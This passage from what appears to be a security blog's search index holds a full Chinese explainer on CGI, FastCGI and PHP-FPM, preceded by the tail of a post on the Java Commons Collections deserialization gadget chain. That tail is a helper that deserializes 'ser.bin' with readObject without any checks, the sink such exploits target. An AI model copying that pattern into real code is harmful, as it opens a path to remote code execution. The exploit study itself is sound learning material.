public static void unserialize(Object obj) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} 参考： 白日梦组长(非常推荐这位up主) ErYao7","link":"/2023/11/06/CommonsCollections/"},{"title":"cgi，php-cgi，fastcgi 、php-fpm之间的关系","text":"前言在做一道ssrf题目时，提到了有关于FastCGI、PHP-FPM，不知道是什么东东 引出概念在整个网站架构中，Web Server（如Apache、Nginx）只是内容的分发者。举个栗子，如果客户端请求的是 index.html，那么Web Server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。 如果请求的是 index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。 当Web Server收到index.php 这个请求后，会启动对应的 CGI 程序，这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程，接下来再引出这些概念，会好理解很多。 CGI：是 Web Server 与 Web Application 之间数据交换的一种协议。 FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。 PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。 PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。 （Web Server 一般指Apache、Nginx、IIS、Tomcat等服务器，Web Application 一般指PHP、Java、Asp.net等应用程序） 概念1、CGICGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php、perl、tcl等。 WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。也就是说，CGI就是专门用来和 web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序（如php-cgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句，返回给web服服务器，WEB服务器再返回给客户端，这就是普通cgi的工作原理。（cgi程序，你就可以理解成遵循cgi协议编写的程序） 优点： CGI的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给web服务器和web应用(如提nginx和php)。他们通过cgi搭线来完成数据传递。这样做的好处了尽量减少2个的关联，使他们2变得更独立。 缺点： 但是CGI有个难受的地方，就是每一次web请求都会有启动和退出过程，也就是最为人诟病的fork-and-execute模式，这样一在大规模并发下，就死翘翘了。 2、FastCGI从根本上来说，FastCGI是用来提高CGI程序性能的。类似于CGI，FastCGI也可以说是一种协议。 FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次。 FastCGI是和语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中，并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。 举例： 当web server收到/index.php请求，看一下CGI程序和FastCGI程序分别是怎么处理的： CGI：当收到web server请求后，会启动对应的CGI程序，这里就是PHP的解析器（php-cgi）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定的CGI规定的格式返回处理后的结果，退出进程。（CGI每次接收到请求都会执行这些步骤） FastCGI：首先，FastCGI程序会先启动一个master，解析配置环境，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然是高。而且当worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源，这就是fastcgi对进程的管理。（CGI程序和FastCGI程序，可以理解成遵循CGI协议和FastCGI协议编写的程序） FastCGI的工作原理： FastCGI接口方式采用C/S结构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或者多个脚本解析守护进程。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程来执行，然后将得到的结果返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求，或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。 （1）Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等) （2）FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。 （3）当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 （4）FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。 CGI与FastCGI比较： （1）对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。 （2）由于FastCGI是多进程，所以比CGI多线程消耗更多的服务器内存，php-cgi解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。 3、PHP-FPM首先要说的是：fastcgi是一个协议，php-fpm实现了这个协议。 大家都知道，PHP的解释器是php-cgi。php-cgi只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理，所以就出现了一些能够调度php-cgi进程的程序，php-fpm就是这样的一个东西。它克服了php-cgi变更php.ini配置后，需重启php-cgi才能让新的php-ini生效，不可以平滑重启，直接杀死php-cgi进程，php就不能运行了的问题。修改php.ini之后，php-cgi进程的确没办法平滑重启的。php-fpm对此的处理机制是新的worker用新的配置，已经存在的worker处理完手上的活就可以歇着了，通过这种机制来平滑过度。 php-fpm提供了更好的php进程管理方式，可以有效的控制内存和进程，可以平滑重载php配置。 总结一下这个升级的过程： 如果要搭建一个高性能的PHP WEB服务器，目前最佳的方式是Apache/Nginx + FastCGI + PHP-FPM(+PHP-CGI)方式了。 结尾这篇文章转载于 程序猿专栏 我在我的vps中nginx用的就是 fastcgi+php-fpm 1234location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;}","link":"/2023/11/08/cgi%EF%BC%8Cphp-cgi%EF%BC%8Cfastcgi%20%E3%80%81php-fpm%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/"}],"tags":[{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"unSerialize","slug":"unSerialize","link":"/tags/unSerialize/"},{"name":"Network","slug":"Network","link":"/tags/Network/"}],"categories":[]}